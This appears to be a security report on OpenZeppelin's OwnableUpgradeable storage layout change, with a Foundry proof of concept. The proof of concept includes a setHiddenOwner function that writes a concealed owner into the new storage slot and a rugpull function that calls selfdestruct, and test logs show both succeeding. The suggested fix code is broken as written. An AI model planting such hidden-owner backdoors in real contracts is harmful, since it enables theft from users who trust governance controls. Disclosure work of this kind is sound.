# No further upgrade possible when upgrading to implementatation compiled with newer `OwnershipUpgradeable`. Malicious developers can set future owner without governance process which can be used for future rugpull.

Critical

## Bug Description
Here's update of `OwnableUpgradable.sol`.

https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/commit/30c455f8a5ee7993ecaf9e247dabce4614976e4a#diff-bc2e685bcf05537b35e44e80fa93658e9b119fa9d892b6d17324dba68516db86
```
abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
-    address private _owner;
+    /// @custom:storage-location erc7201:openzeppelin.storage.Ownable
+    struct OwnableStorage {
+        address _owner;
+    }

+    // keccak256(abi.encode(uint256(keccak256("openzeppelin.storage.Ownable")) - 1)) & ~bytes32(uint256(0xff))
+    bytes32 private constant OwnableStorageLocation = 0x9016d09d72d40fdae2fd8ceac6b6234c7706214fd39c1cd1e609a0528c199300;

+    function _getOwnableStorage() private pure returns (OwnableStorage storage $) {
+        assembly {
+            $.slot := OwnableStorageLocation
+        }
+    }
```

After upgrade to new implementation compiled with newer version of `OwnerableUpgradeable`, `owner()` will return zero address because of storage layout change, which means sudden renouncement of ownership.

## Impact
- Developers who upgraded to new implementation compiled with newer version will find themselves in a situation that no further upgrade is possible.  
  - A lot of storage layout changes introduced for `AccessControlUpgradeable`, `Ownable2StepUpgradeable ` might be problematic to developers.

- Malicious developers might hide future owner address to new slot bypassing governance process, which can be used for rugpull after upgrade to new implmentation.

## Recommendation
1) owner() should fallback to old owner address if there is any.
2) There should be ownership migration feature from old version.

```solidity
+   address private _oldOwner;

    function owner() public view virtual returns (address) {
+        if (_oldOwner != address(0))
+          return _oldOwner;
        OwnableStorage storage $ = _getOwnableStorage();
        return $._owner;
    }

+    function migrate() external {
+        require(_oldOwner == msg.sender);
+        _oldOwner = address(0);
+        _getOwnableStorage() = msg.sender;   
+    }
```

## Proof of Concept

```solidity
pragma solidity 0.8.20;

import "forge-std/Test.sol";

import { ContextUpgradeable } from "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
import { Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import { UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import { OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import { ERC1967Proxy } from '@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol';

contract OldImpl is UUPSUpgradeable, OwnableUpgradeableOld {
    /// @custom:storage-location erc7201:openzeppelin.storage.Ownable
    struct OwnableStorage {
        address _owner;
    }
    
    constructor() initializer {
    }    

    function initialize() initializer external {
        __Ownable_init(msg.sender);
    }

    function setHiddenOwner(address hiddenOwner) external {
        OwnableStorage storage s;
        assembly {
            s.slot := 0x9016d09d72d40fdae2fd8ceac6b6234c7706214fd39c1cd1e609a0528c199300
        }
        s._owner = hiddenOwner;
    }

    function _authorizeUpgrade(address newImplementation) override internal onlyOwner {}

}

contract NewImpl is UUPSUpgradeable, OwnableUpgradeableNew {
    constructor() initializer {
    }    

    function initialize() initializer external {
        __Ownable_init(msg.sender);
    }

    function rugpull() onlyOwner external {
      selfdestruct(payable(msg.sender));
    }

    function _authorizeUpgrade(address newImplementation) override internal onlyOwner {}

}

contract OwnableUpgradeableTest is Test {
  function setUp() public {
  }

  function testUpgrade() public {
    address oldImpl = address(new OldImpl());
    address newImpl = address(new NewImpl());
    address newImpl2 = address(new NewImpl());

    console.log("Step 1 - Deploy implmentation compiled with OwnableUpgradeableOld");
    address proxy = address(new ERC1967Proxy(oldImpl, abi.encodeWithSignature("initialize()")));
    
    console.log("Step 2 - Upgrade to implmentation compiled with OwnableUpgradeableNew");
    console.log("Owner before upgrade", OwnableUpgradeableOld(proxy).owner());
    UUPSUpgradeable(proxy).upgradeToAndCall(newImpl, bytes(""));    
    console.log("Owner after upgrade", OwnableUpgradeableNew(proxy).owner());

    console.log("Step 3 - Subsequent upgrade will revert!!!");
    vm.expectRevert();
    UUPSUpgradeable(proxy).upgradeToAndCall(newImpl2, bytes(""));    
 }

  function testRugpull() public {
    address oldImpl = address(new OldImpl());
    address newImpl = address(new NewImpl());
    address newImpl2 = address(new NewImpl());
    address alice = address(0xaaaaaaaaaaaaaaaaaaa);

    console.log("Step 1 - Deploy implmentation compiled with OwnableUpgradeableOld");
    address proxy = address(new ERC1967Proxy(oldImpl, abi.encodeWithSignature("initialize()")));
    
    console.log("Step 2 - Upgrade to implmentation compiled with OwnableUpgradeableNew");
    console.log("Owner before upgrade", OwnableUpgradeableOld(proxy).owner());
    OldImpl(proxy).setHiddenOwner(alice);
    UUPSUpgradeable(proxy).upgradeToAndCall(newImpl, bytes(""));
    console.log("Owner after upgrade", OwnableUpgradeableNew(proxy).owner());

    console.log("Step 3 - Rugpull successfull !!!");
    vm.prank(alice);
    NewImpl(proxy).rugpull();
  }

}

```

### Output for Upgrade

forge test --match-test Upgrade -vv
```
Running 1 test for test/OwnableUpgradeableTest.sol:OwnableUpgradeableTest
[PASS] testUpgrade() (gas: 1852353)
Logs:
  Step 1 - Deploy implmentation compiled with OwnableUpgradeableOld
  Step 2 - Upgrade to implmentation compiled with OwnableUpgradeableNew
  Owner before upgrade 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
  Owner after upgrade 0x0000000000000000000000000000000000000000
  Step 3 - Subsequent upgrade will revert!!!
```

### Output for Rugpull

forge test --match-test Rugpull -vv
```
Running 1 test for test/OwnableUpgradeableTest.sol:OwnableUpgradeableTest
[PASS] testRugpull() (gas: 1877388)
Logs:
  Step 1 - Deploy implmentation compiled with OwnableUpgradeableOld
  Step 2 - Upgrade to implmentation compiled with OwnableUpgradeableNew
  Owner before upgrade 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
  Owner after upgrade 0x000000000000000000000AAaaaaaaaaAAaaaaAAA
  Step 3 - Rugpull successfull !!!

```

### OwnableUpgradeableOld && OwnableUpgradeableNew

```solidity
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract OwnableUpgradeableOld is Initializable, ContextUpgradeable {
    address private _owner;

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    function __Ownable_init(address initialOwner) internal onlyInitializing {
        __Ownable_init_unchained(initialOwner);
    }

    function __Ownable_init_unchained(address initialOwner) internal onlyInitializing {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[49] private __gap;
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract OwnableUpgradeableNew is Initializable, ContextUpgradeable {
    /// @custom:storage-location erc7201:openzeppelin.storage.Ownable
    struct OwnableStorage {
        address _owner;
    }

    // keccak256(abi.encode(uint256(keccak256("openzeppelin.storage.Ownable")) - 1)) & ~bytes32(uint256(0xff))
    bytes32 private constant OwnableStorageLocation = 0x9016d09d72d40fdae2fd8ceac6b6234c7706214fd39c1cd1e609a0528c199300;

    function _getOwnableStorage() private pure returns (OwnableStorage storage $) {
        assembly {
            $.slot := OwnableStorageLocation
        }
    }

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    function __Ownable_init(address initialOwner) internal onlyInitializing {
        __Ownable_init_unchained(initialOwner);
    }

    function __Ownable_init_unchained(address initialOwner) internal onlyInitializing {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        OwnableStorage storage $ = _getOwnableStorage();
        return $._owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        OwnableStorage storage $ = _getOwnableStorage();
        address oldOwner = $._owner;
        $._owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
```
